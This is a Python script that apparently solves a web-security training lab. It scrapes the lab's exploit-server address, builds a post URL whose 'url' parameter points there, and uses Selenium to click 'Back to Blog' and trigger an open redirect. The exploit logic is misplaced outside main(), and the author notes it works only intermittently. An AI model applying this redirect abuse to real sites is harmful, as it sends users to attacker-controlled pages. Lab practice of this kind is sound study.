import os
import re
import sys
import requests
import time
from selenium import webdriver
from selenium.webdriver.firefox.service import Service as FirefoxService
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.common.by import By

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
my_acc = burp_url + '/my-account'

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'})

response = session.get(burp_url)
match = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
exploit_server = match.group(0)

solution = burp_url + '/post?postId=4&url=' + exploit_server + '/'
print(solution)
driver = webdriver.Firefox(service=FirefoxService(GeckoDriverManager().install()))
driver.get(solution)

time.sleep(3)

driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
time.sleep(2)

back_to_blog_button = driver.find_element(By.LINK_TEXT, "Back to Blog")
back_to_blog_button.click()

time.sleep(5)

driver.quit()

if __name__ == "__main__":
    main()

print("I don't know why sometimes the exploit doesn't work right away. Run it a few times and suddenly it scores a response")
